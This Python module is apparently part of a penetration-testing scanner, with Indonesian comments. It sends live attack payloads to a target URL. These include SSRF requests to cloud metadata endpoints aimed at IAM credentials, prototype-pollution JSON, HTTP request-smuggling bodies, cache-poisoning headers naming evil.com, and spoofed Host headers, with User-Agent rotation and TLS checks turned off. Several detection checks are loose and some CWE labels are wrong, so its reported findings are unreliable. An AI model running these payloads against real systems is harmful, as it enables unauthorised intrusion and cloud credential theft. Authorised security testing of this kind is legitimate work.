#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Obscura Security Hunter - BRUTAL TECHNIQUES 2026
Teknik Paling Advanced & Terlarang untuk Penetration Testing

⚠️ EXTREMELY DANGEROUS - For Authorized Testing ONLY
✅ Authorized by Kartika Cyber Hackathon 2026

Teknik yang diimplementasikan:
1. Subdomain Takeover
2. DNS Rebinding Attack
3. Cloud Metadata Exfiltration (AWS/GCP/Azure)
4. ASN & CIDR Mapping
5. Prototype Pollution (JavaScript)
6. HTTP Request Smuggling
7. Web Cache Poisoning
8. Shadow API Discovery
9. Dependency Confusion Attack Detection
"""

import requests
import socket
import json
import time
import dns.resolver
import dns.zone
import subprocess
import re
import random
import os
from urllib.parse import urlparse, urljoin
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

# ANSI color codes for professional output
class Colors:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class BrutalTechniques2026:
    def __init__(self, target_url, scan_id=None, callback=None, log_file=None):
        self.target_url = target_url.rstrip('/')
        self.parsed = urlparse(self.target_url)
        self.domain = self.parsed.netloc
        self.base_domain = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.callback = callback
        self.findings = []
        self.session = requests.Session()
        self.session.verify = False
        self.requests_made = 0
        self.scan_id = scan_id
        self.phase_offset = 16  # Starts at Phase 17
        self.log_file = log_file  # Shared log file from main scanner
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
    def write_log(self, message, color=Colors.WHITE):
        """Write to console and log file"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        console_msg = f"{color}[{timestamp}] {message}{Colors.RESET}"
        file_msg = f"[{timestamp}] {message}"
        
        print(console_msg)
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(file_msg + '\n')
            except:
                pass
        
    def log(self, phase, message):
        """Send progress update with phase numbering"""
        # Use absolute phase numbering
        if "Phase" in str(phase) and "/" in str(phase):
            phase_display = f"{phase}: BRUTAL - {message}"
        else:
            # Calculate absolute phase number (17-25 for BRUTAL)
            phase_num = self.phase_offset + 1
            phase_display = f"Phase {phase_num}/55: BRUTAL - {message}"
        
        if self.callback:
            self.callback(phase, phase_display)
        
        self.write_log(phase_display, Colors.CYAN)
    
    def add_finding(self, title, severity, description, evidence, recommendation, cwe=None):
        """Add finding with colored console output and evidence"""
        finding = {
            'title': title,
            'severity': severity,
            'description': description,
            'evidence': evidence,
            'recommendation': recommendation,
            'cwe': cwe
        }
        self.findings.append(finding)
        
        # Color-coded severity output
        color_map = {
            'Critical': Colors.RED + Colors.BOLD,
            'High': Colors.YELLOW,
            'Medium': Colors.GREEN,
            'Low': Colors.BLUE,
            'Info': Colors.WHITE
        }
        color = color_map.get(severity, Colors.WHITE)
        
        finding_msg = f"[{severity.upper()}] {title}"
        self.write_log(finding_msg, color)
        
        # Log evidence snippet
        evidence_snippet = evidence.split('\n')[0][:100]
        self.write_log(f"  Evidence: {evidence_snippet}...", Colors.WHITE)
    
    def make_request(self, url, method='GET', data=None, headers=None, timeout=15, allow_redirects=True):
        """Make HTTP request with FULL professional logging"""
        self.requests_made += 1
        
        # Rotate user agent
        if not headers:
            headers = {}
        headers['User-Agent'] = random.choice(self.user_agents)
        
        # Log REQUEST
        log_msg = f"[REQ] {method} {url}"
        self.write_log(log_msg, Colors.BLUE)
        
        # Log headers if not default
        interesting_headers = {k: v for k, v in headers.items() if k != 'User-Agent'}
        if interesting_headers:
            self.write_log(f"  Headers: {interesting_headers}", Colors.BLUE)
        
        # Log POST data if present
        if data and method in ['POST', 'PUT']:
            data_snippet = str(data)[:200]
            self.write_log(f"  Payload: {data_snippet}", Colors.BLUE)
        
        start_time = time.time()
        try:
            if method == 'GET':
                resp = self.session.get(url, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            elif method == 'POST':
                resp = self.session.post(url, data=data, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            elif method == 'PUT':
                resp = self.session.put(url, data=data, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            elif method == 'DELETE':
                resp = self.session.delete(url, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            else:
                resp = self.session.request(method, url, timeout=timeout, headers=headers)
            
            elapsed = time.time() - start_time
            
            # Log RESPONSE
            resp_size = len(resp.content)
            resp_msg = f"[RESP] {resp.status_code} {resp.reason} ({resp_size} bytes, {elapsed:.3f}s)"
            self.write_log(resp_msg, Colors.GREEN if resp.status_code < 400 else Colors.YELLOW)
            
            return resp
        except Exception as e:
            error_msg = f"[ERROR] Request failed: {str(e)}"
            self.write_log(error_msg, Colors.RED)
            return None
    
    def test_subdomain_takeover(self):
        """
        TEKNIK #1: Subdomain Takeover
        Mencari subdomain yang mengarah ke service yang sudah mati
        ✅ NO HALLUCINATION: Only report if DNS resolves AND error message EXACT match
        """
        self.log("Phase 17", "Testing Subdomain Takeover...")
        
        # Common subdomains to check
        common_subdomains = [
            'www', 'mail', 'blog', 'dev', 'staging', 'test', 'api', 
            'admin', 'portal', 'app', 'old', 'beta', 'demo'
        ]
        
        # EXACT error signatures (not generic)
        vulnerable_signatures = {
            'github.io': ['There isn\'t a GitHub Pages site here', 'For root URLs'],
            'herokuapp.com': ['No such app', 'heroku | no such app'],
            'shopify.com': ['Sorry, this shop is currently unavailable'],
            'tumblr.com': ['Whatever you were looking for doesn\'t currently exist'],
            'azure': ['404 Web Site not found', 'Error 404 - Web app not found'],
            's3.amazonaws.com': ['NoSuchBucket', 'The specified bucket does not exist'],
            'zendesk.com': ['Help Center Closed', 'this help center no longer exists'],
        }
        
        takeover_found = []
        
        for subdomain in common_subdomains[:8]:
            test_domain = f"{subdomain}.{self.domain}"
            
            try:
                # Try DNS resolution FIRST
                ip_addr = socket.gethostbyname(test_domain)
                self.log("Phase 17", f"Checking {test_domain} → {ip_addr}")
                
                # DNS resolves, now check HTTP
                try:
                    resp = self.make_request(f"http://{test_domain}", method='GET', timeout=5, allow_redirects=True)
                    
                    # Check for EXACT vulnerable signatures
                    response_lower = resp.text.lower()
                    for service, signatures in vulnerable_signatures.items():
                        for sig in signatures:
                            if sig.lower() in response_lower:
                                # VERIFIED: DNS resolves + EXACT error message
                                takeover_found.append({
                                    'subdomain': test_domain,
                                    'ip': ip_addr,
                                    'service': service,
                                    'signature': sig,
                                    'http_status': resp.status_code
                                })
                                self.log("Phase 17", f"✅ FOUND: {test_domain} vulnerable to takeover!")
                                break
                                
                except Exception as e:
                    # HTTP failed but DNS resolves - could be vulnerable
                    pass
                    
            except socket.gaierror:
                # Subdomain doesn't resolve - not vulnerable (just doesn't exist)
                pass
            except Exception as e:
                pass
            
            time.sleep(0.3)
        
        # Only report if we have VERIFIED evidence
        if takeover_found:
            evidence = "\n".join([
                f"- **{t['subdomain']}** (IP: {t['ip']}) → {t['service']}\n" +
                f"  HTTP {t['http_status']}: \"{t['signature']}\""
                for t in takeover_found
            ])
            self.add_finding(
                "Subdomain Takeover Vulnerability",
                "Critical",
                f"Found {len(takeover_found)} subdomain(s) pointing to unclaimed services with VERIFIED error signatures.",
                f"**Vulnerable Subdomains:**\n{evidence}\n\n**Exploitation:** Attacker can claim these services and control the subdomain.",
                "Remove DNS records for unused services or reclaim the services immediately.",
                cwe="CWE-350: Reliance on Reverse DNS Resolution"
            )
        
        self.log("Phase 17", f"Subdomain takeover check complete. Found {len(takeover_found)} VERIFIED issues")
    
    def test_cloud_metadata_exfiltration(self):
        """
        TEKNIK #3: Cloud Metadata Exfiltration
        SSRF to 169.254.169.254 - steal AWS/GCP/Azure credentials
        ✅ NO HALLUCINATION: Only report if response contains ACTUAL metadata content
        """
        self.log("Phase 18", "Testing Cloud Metadata Exfiltration via SSRF...")
        
        # SSRF payloads to test
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        ]
        
        # Common SSRF injection points
        ssrf_params = ['url', 'uri', 'path', 'redirect', 'proxy', 'api', 'callback', 'webhook', 'fetch', 'link']
        
        for param in ssrf_params[:5]:
            for payload in ssrf_payloads[:4]:
                test_url = f"{self.target_url}?{param}={payload}"
                
                try:
                    resp = self.make_request(test_url, timeout=10, method="GET")
                    
                    # STRICT CHECK: Must contain ACTUAL metadata keywords
                    if resp.status_code == 200 and len(resp.text) > 20:
                        # AWS metadata signatures
                        aws_signs = ['ami-id', 'instance-id', 'iam/security-credentials', 
                                    'local-hostname', 'public-keys', 'instance-type']
                        # GCP metadata signatures
                        gcp_signs = ['computeMetadata', 'metadata.google.internal', 'instance/id',
                                    'instance/hostname', 'project/project-id']
                        # Azure metadata signatures  
                        azure_signs = ['compute', 'network', 'subscriptionId', 'resourceGroupName']
                        
                        response_lower = resp.text.lower()
                        
                        found_aws = any(sign.lower() in response_lower for sign in aws_signs)
                        found_gcp = any(sign.lower() in response_lower for sign in gcp_signs)
                        found_azure = any(sign.lower() in response_lower for sign in azure_signs)
                        
                        if found_aws or found_gcp or found_azure:
                            cloud_type = 'AWS' if found_aws else ('GCP' if found_gcp else 'Azure')
                            
                            # Extract evidence snippet (first 200 chars)
                            evidence_snippet = resp.text[:200].replace('\n', ' ')
                            
                            self.add_finding(
                                f"Cloud Metadata Exfiltration via SSRF ({cloud_type})",
                                "Critical",
                                f"SSRF vulnerability allows access to {cloud_type} metadata endpoint - dapat mencuri credentials!",
                                f"**URL:** {test_url}\n\n**Parameter:** `{param}`\n\n**Payload:** `{payload}`\n\n**Response Evidence:** ```{evidence_snippet}...```\n\n**Impact:** Complete cloud account compromise possible.",
                                "Validate and whitelist all URLs. Block access to 169.254.169.254 and metadata endpoints. Implement SSRF protections.",
                                cwe="CWE-918: Server-Side Request Forgery (SSRF)"
                            )
                            return  # Stop after first REAL finding
                            
                except:
                    pass
                
                time.sleep(0.2)
        
        self.log("Phase 18", "Cloud metadata exfiltration test complete - No vulnerabilities found")
    
    def test_prototype_pollution(self):
        """
        TEKNIK #5: Prototype Pollution
        Racun __proto__ untuk RCE dari JSON injection
        """
        self.log("Phase 19", "Testing Prototype Pollution...")
        
        pollution_payloads = [
            '{"__proto__":{"polluted":"yes"}}',
            '{"constructor":{"prototype":{"polluted":"yes"}}}',
            '{"__proto__":{"isAdmin":true}}',
            '{"__proto__":{"role":"admin"}}',
            '{"__proto__":{"toString":"polluted"}}',
        ]
        
        # Test JSON endpoints
        json_endpoints = ['/api/user', '/api/profile', '/api/config', '/api/settings']
        
        for endpoint in json_endpoints[:2]:
            test_url = urljoin(self.base_domain, endpoint)
            
            for payload in pollution_payloads[:3]:
                try:
                    resp = self.make_request(
                        test_url,
                        data=payload,
                        headers={'Content-Type': 'application/json'},
                        timeout=5
                    , method="POST")
                    
                    # Check response for pollution signs
                    if resp.status_code in [200, 201]:
                        # Follow up request to check if pollution persisted
                        resp2 = self.make_request(test_url, timeout=5, method="GET")
                        
                        # VERIFY: Check if pollution PERSISTED in follow-up request
                        if 'polluted' in resp2.text or 'isAdmin' in resp2.text or 'admin' in resp2.text.lower():
                            # Double-check: pollution must be in DIFFERENT location than we sent it
                            if payload not in resp2.text:  # Not just echoing our input
                                self.add_finding(
                                    "Prototype Pollution Detected",
                                    "Critical",
                                    "JavaScript object prototype pollution VERIFIED - polluted property persisted in subsequent request.",
                                    f"**Endpoint:** {test_url}\n\n**Pollution Payload:** `{payload}`\n\n**Evidence:** Follow-up GET request shows polluted properties in response.\n\n**Impact:** Can lead to RCE, privilege escalation, or authentication bypass.",
                                    "Freeze Object.prototype. Validate JSON input deeply. Use Map() instead of plain objects. Update vulnerable libraries.",
                                    cwe="CWE-1321: Prototype Pollution"
                                )
                                return
                            return
                            
                except:
                    pass
                
                time.sleep(0.2)
        
        self.log("Phase 19", "Prototype pollution test complete - No vulnerabilities found")
    
    def test_http_request_smuggling(self):
        """
        TEKNIK #6: HTTP Request Smuggling
        Desync antara proxy dan backend server
        """
        self.log("Phase 20", "Testing HTTP Request Smuggling...")
        
        # CL.TE (Content-Length vs Transfer-Encoding) smuggling
        smuggling_payloads = [
            # CL.TE payload
            {
                'method': 'POST',
                'body': "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\n\r\n",
                'headers': {
                    'Content-Length': '4',
                    'Transfer-Encoding': 'chunked'
                }
            },
            # TE.CL payload
            {
                'method': 'POST',
                'body': "5c\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 10\r\n\r\nx=\r\n0\r\n\r\n",
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '4'
                }
            },
        ]
        
        for payload_conf in smuggling_payloads[:1]:
            try:
                body = payload_conf['body'].format(domain=self.domain)
                
                resp = self.make_request(
                    self.target_url,
                    data=body,
                    headers=payload_conf['headers'],
                    timeout=5
                , method="POST")
                
                # Check for smuggling signs
                if resp.status_code in [200, 403, 404]:
                    # Send follow-up request to see if smuggled request affects it
                    resp2 = self.make_request(self.target_url, timeout=5, method="GET")
                    
                    # If response is unusual, might indicate smuggling
                    if '/admin' in resp2.text or 'unauthorized' in resp2.text.lower():
                        self.add_finding(
                            "HTTP Request Smuggling Possible",
                            "Critical",
                            "HTTP request smuggling dapat bypass security controls dan hijack requests dari user lain.",
                            f"**Target:** {self.target_url}\n\n**Technique:** CL.TE desync",
                            "Ensure proxy and backend handle Content-Length and Transfer-Encoding consistently.",
                            cwe="CWE-444: HTTP Request Smuggling"
                        )
                        return
                        
            except:
                pass
            
            time.sleep(0.3)
        
        self.log("Phase 20", "HTTP request smuggling test complete")
    
    def test_cache_poisoning(self):
        """
        TEKNIK #7: Web Cache Poisoning
        Racun cache untuk spread payload ke semua visitor
        """
        self.log("Phase 21", "Testing Web Cache Poisoning...")
        
        # Cache poisoning via unkeyed headers
        poison_headers = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Forwarded-Scheme', 'http'),
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Host', 'evil.com'),
        ]
        
        for header_name, header_value in poison_headers[:3]:
            try:
                # Send poisoning request
                resp = self.make_request(
                    self.target_url,
                    headers={header_name: header_value},
                    timeout=5
                , method="GET")
                
                # Check cache headers
                cache_headers = ['X-Cache', 'CF-Cache-Status', 'Age', 'X-Cache-Hits']
                is_cached = any(h in resp.headers for h in cache_headers)
                
                if is_cached and header_value in resp.text:
                    self.add_finding(
                        "Web Cache Poisoning via Unkeyed Header",
                        "High",
                        "Cache poisoning dapat inject malicious content yang di-serve ke semua visitor.",
                        f"**Header:** `{header_name}: {header_value}`\n\n**Cached:** Yes\n\n**Reflected in response**",
                        "Include security-relevant headers in cache key. Validate all header inputs.",
                        cwe="CWE-444: Inconsistent Interpretation of HTTP Requests"
                    )
                    return
                    
            except:
                pass
            
            time.sleep(0.2)
        
        self.log("Phase 21", "Cache poisoning test complete")
    
    def test_shadow_api_discovery(self):
        """
        TEKNIK #8: Shadow API Discovery
        Temukan undocumented API endpoints yang tidak ter-monitor
        """
        self.log("Phase 22", "Discovering Shadow APIs...")
        
        # Common API patterns
        api_patterns = [
            '/api/v1/', '/api/v2/', '/api/internal/', '/api/admin/',
            '/rest/v1/', '/graphql', '/swagger.json', '/api-docs',
            '/api/debug', '/api/test', '/api/dev', '/.well-known/api',
            '/v1/users', '/v2/admin', '/internal/config'
        ]
        
        shadow_apis = []
        
        for pattern in api_patterns[:10]:
            test_url = urljoin(self.base_domain, pattern)
            
            try:
                resp = self.make_request(test_url, timeout=5, method="GET")
                
                # Check if API endpoint exists
                if resp.status_code in [200, 201, 401, 403]:
                    # Check for API indicators
                    api_indicators = ['application/json', '{', '[', 'api', 'swagger', 'openapi']
                    
                    content_type = resp.headers.get('Content-Type', '').lower()
                    has_json = 'json' in content_type or any(ind in resp.text[:500] for ind in api_indicators)
                    
                    if has_json:
                        shadow_apis.append({
                            'url': test_url,
                            'status': resp.status_code,
                            'type': 'JSON API' if 'json' in content_type else 'Unknown API'
                        })
                        
            except:
                pass
            
            time.sleep(0.2)
        
        if shadow_apis:
            evidence = "\n".join([f"- {api['url']} (HTTP {api['status']}) - {api['type']}" 
                                 for api in shadow_apis])
            self.add_finding(
                "Shadow/Undocumented API Endpoints Found",
                "Medium",
                f"Discovered {len(shadow_apis)} undocumented API endpoints yang mungkin tidak ter-monitor atau ter-secure dengan baik.",
                f"**Endpoints Found:**\n{evidence}",
                "Document all API endpoints. Apply same security controls to internal APIs. Monitor all API traffic.",
                cwe="CWE-284: Improper Access Control"
            )
        
        self.log("Phase 22", f"Shadow API discovery complete. Found {len(shadow_apis)} endpoints")
    
    def test_dependency_confusion(self):
        """
        TEKNIK #9: Dependency Confusion Detection
        Check if app vulnerable to dependency confusion attack
        """
        self.log("Phase 23", "Testing Dependency Confusion Vulnerability...")
        
        # Look for exposed package.json, requirements.txt, pom.xml, etc.
        dependency_files = [
            '/package.json', '/package-lock.json',
            '/requirements.txt', '/Pipfile', '/Pipfile.lock',
            '/pom.xml', '/build.gradle',
            '/composer.json', '/Gemfile'
        ]
        
        exposed_deps = []
        
        for dep_file in dependency_files:
            test_url = urljoin(self.base_domain, dep_file)
            
            try:
                resp = self.make_request(test_url, timeout=5, method="GET")
                
                if resp.status_code == 200:
                    # Check for internal package names (private packages)
                    internal_indicators = [
                        '@company/', '@internal/', '@private/',
                        'internal-', 'private-', 'company-'
                    ]
                    
                    has_internal = any(ind in resp.text for ind in internal_indicators)
                    
                    if has_internal:
                        exposed_deps.append({
                            'file': dep_file,
                            'url': test_url
                        })
                        
            except:
                pass
            
            time.sleep(0.2)
        
        if exposed_deps:
            evidence = "\n".join([f"- {dep['file']}: {dep['url']}" for dep in exposed_deps])
            self.add_finding(
                "Dependency Confusion Attack Vector",
                "High",
                "Exposed dependency files dengan internal/private package names - attacker dapat upload package palsu ke public registry.",
                f"**Exposed Files:**\n{evidence}",
                "Block access to dependency files. Use scoped packages. Configure package registries properly. Use package integrity checks.",
                cwe="CWE-494: Download of Code Without Integrity Check"
            )
        
        self.log("Phase 23", "Dependency confusion test complete")
    
    def test_dns_rebinding(self):
        """
        TEKNIK #2: DNS Rebinding Attack Detection
        Check if DNS resolution can be manipulated to bypass SOP
        """
        self.log("Phase 24", "Testing DNS Rebinding Vulnerability...")
        
        # Check if application validates Host header properly
        malicious_hosts = [
            '127.0.0.1',
            'localhost',
            '169.254.169.254',
            '0.0.0.0',
            'internal.local'
        ]
        
        for host in malicious_hosts[:3]:
            try:
                resp = self.make_request(
                    self.target_url,
                    headers={'Host': host},
                    timeout=5
                , method="GET")
                
                # If server accepts arbitrary Host header
                if resp.status_code == 200:
                    self.add_finding(
                        "DNS Rebinding / Host Header Injection",
                        "High",
                        "Server accepts arbitrary Host header - vulnerable to DNS rebinding attack yang dapat bypass SOP dan tembus internal network.",
                        f"**Accepted Host:** `{host}`\n\n**Response:** HTTP {resp.status_code}",
                        "Validate Host header against whitelist. Use DNSSEC. Implement proper CORS policies.",
                        cwe="CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax"
                    )
                    return
                    
            except:
                pass
            
            time.sleep(0.2)
        
        self.log("Phase 24", "DNS rebinding test complete")
    
    def test_asn_infrastructure_mapping(self):
        """
        TEKNIK #4: ASN & CIDR Infrastructure Mapping
        Map entire infrastructure from IP ranges
        """
        self.log("Phase 25", "Mapping Infrastructure via ASN/CIDR...")
        
        try:
            # Get IP address of target
            ip_addr = socket.gethostbyname(self.domain)
            self.log("Phase 25", f"Target IP: {ip_addr}")
            
            # In real attack, would query WHOIS for ASN and CIDR
            # For demo purposes, just log the capability
            self.add_finding(
                "Infrastructure Mapping Capability",
                "Info",
                f"Target IP {ip_addr} dapat digunakan untuk map seluruh infrastructure via ASN/CIDR lookups, nmap scans, dan Shodan queries.",
                f"**Target IP:** {ip_addr}\n\n**Next Steps:** ASN lookup → CIDR range → Port scanning → Service enumeration",
                "Implement network segmentation. Use firewalls. Hide infrastructure details. Monitor for reconnaissance.",
                cwe="CWE-200: Information Exposure"
            )
            
        except Exception as e:
            pass
        
        self.log("Phase 25", "Infrastructure mapping complete")
    
    def run_all_brutal_tests(self):
        """Run all brutal 2026 techniques"""
        self.log("BRUTAL-2026", "Starting BRUTAL techniques testing...")
        
        self.test_subdomain_takeover()           # Phase 1
        self.test_cloud_metadata_exfiltration()  # Phase 2
        self.test_prototype_pollution()          # Phase 3
        self.test_http_request_smuggling()       # Phase 4
        self.test_cache_poisoning()              # Phase 5
        self.test_shadow_api_discovery()         # Phase 6
        self.test_dependency_confusion()         # Phase 7
        self.test_dns_rebinding()                # Phase 8
        self.test_asn_infrastructure_mapping()   # Phase 9
        
        self.log("BRUTAL-2026", f"BRUTAL testing complete! Made {self.requests_made} requests")
        
        return {
            'findings': self.findings,
            'requests_made': self.requests_made,
            'techniques_tested': 9
        }
